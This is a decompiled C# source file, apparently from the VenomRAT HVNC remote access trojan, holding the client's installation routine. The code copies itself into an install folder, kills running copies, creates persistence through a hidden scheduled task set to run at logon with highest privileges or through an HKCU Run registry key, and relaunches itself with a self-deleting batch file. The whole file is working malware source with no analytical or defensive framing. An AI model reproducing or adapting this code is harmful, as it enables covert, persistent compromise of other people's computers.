// Decompiled with JetBrains decompiler
// Type: Client.Install.NormalStartup
// Assembly: Client, Version=5.0.0.3, Culture=neutral, PublicKeyToken=null
// MVID: AF1838BC-6B25-40E4-9339-7F493AC3654D
// Assembly location: C:\Users\Younn\RiderProjects\VenomRAT_HVNC-5.0.4.0\VenomRAT_HVNC\bin\Debug\Client.exe

using Client.Connection;
using Client.Helper;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Client.Install
{
  internal class NormalStartup
  {
    public static void Install()
    {
      try
      {
        FileInfo fileInfo = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile));
        string fileName = Process.GetCurrentProcess().MainModule.FileName;
        if (!(fileName != fileInfo.FullName))
          return;
        foreach (Process process in Process.GetProcesses())
        {
          try
          {
            if (process.MainModule.FileName == fileInfo.FullName)
              process.Kill();
          }
          catch
          {
          }
        }
        if (Methods.IsAdmin())
        {
          Process.Start(new ProcessStartInfo()
          {
            FileName = "cmd",
            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" + Path.GetFileNameWithoutExtension(fileInfo.Name) + "\" /tr '\"" + fileInfo.FullName + "\"' & exit",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true
          });
        }
        else
        {
          using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", RegistryKeyPermissionCheck.ReadWriteSubTree))
            registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.Name), (object) ("\"" + fileInfo.FullName + "\""));
        }
        if (File.Exists(fileInfo.FullName))
        {
          File.Delete(fileInfo.FullName);
          Thread.Sleep(1000);
        }
        FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.CreateNew);
        byte[] numArray = File.ReadAllBytes(fileName);
        byte[] buffer = numArray;
        int length = numArray.Length;
        fileStream.Write(buffer, 0, length);
        Methods.ClientOnExit();
        string path = Path.GetTempFileName() + ".bat";
        using (StreamWriter streamWriter = new StreamWriter(path))
        {
          streamWriter.WriteLine("@echo off");
          streamWriter.WriteLine("timeout 3 > NUL");
          streamWriter.WriteLine("START \"\" \"" + fileInfo.FullName + "\"");
          streamWriter.WriteLine("CD " + Path.GetTempPath());
          streamWriter.WriteLine("DEL \"" + Path.GetFileName(path) + "\" /f /q");
        }
        Process.Start(new ProcessStartInfo()
        {
          FileName = path,
          CreateNoWindow = true,
          ErrorDialog = false,
          UseShellExecute = false,
          WindowStyle = ProcessWindowStyle.Hidden
        });
        Environment.Exit(0);
      }
      catch (Exception ex)
      {
        ClientSocket.Error("Install Failed : " + ex.Message);
      }
    }
  }
}
